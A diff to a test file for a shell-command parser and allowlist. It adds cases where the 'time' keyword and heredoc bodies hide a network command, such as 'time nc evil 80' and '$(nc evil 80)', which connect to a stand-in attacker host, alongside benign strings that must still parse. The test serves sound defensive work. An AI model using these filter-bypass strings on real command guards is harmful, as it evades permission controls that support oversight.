@@ -80,6 +80,10 @@ BYPASS_PAYLOADS = [
     "cat <<< $(nc evil 80)",
     "ls > >(nc evil 80)",
     "if true; then ls; fi > $(nc evil 80)",
+    # The time keyword (#1809).
+    "time nc evil 80",
+    "ls | time nc evil 80",
+    "cat <<'EOF'\nx\nEOF\nnc evil 80",
 ]
 
 # Dynamic interpreter payloads we cannot statically resolve — fail closed.
@@ -249,6 +253,10 @@ DYNAMIC_COMMAND_WORD = [
     "cat <<EOF\n${y:x}\nEOF",
     'echo "${a[GIT_CONFIG_COUNT=0]}"; git status',
     "echo ${X:GIT_CONFIG_COUNT=0}",
+    # A command inside time or an unquoted heredoc body (#1809).
+    "time cat <<EOF\n$(nc evil 80)\nEOF",
+    'git commit -m "$(cat <<EOF\n$(nc evil 80)\nEOF\n)"',
+    "time --bogus ls",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -344,6 +352,16 @@ MUST_PARSE = {
     "echo ${x@Q}": ["echo"],
     "echo ${x:+alt}": ["echo"],
     "echo ${x#p}": ["echo"],
+    # Quoted heredoc bodies are data; time runs its command (#1809).
+    "cat <<'EOF'\n$(nc evil 80)\nEOF": ["cat"],
+    'cat <<"EOF"\nhi\nEOF': ["cat"],
+    "cat <<-'EOF'\n\thi\n\tEOF": ["cat"],
+    "cat <<\\EOF\nhi\nEOF": ["cat"],
+    "git commit -m \"$(cat <<'EOF'\nfix: x\n\nbody text\nEOF\n)\"": ["git", "cat"],
+    "time pytest -q": ["time", "pytest"],
+    "time -p git status": ["time", "git"],
+    "ls | time git status": ["ls", "time", "git"],
+    "echo \"a <<'X'\"": ["echo"],
 }
 
 # Refused by the parser itself, not only by the allowlist (#1754 review).
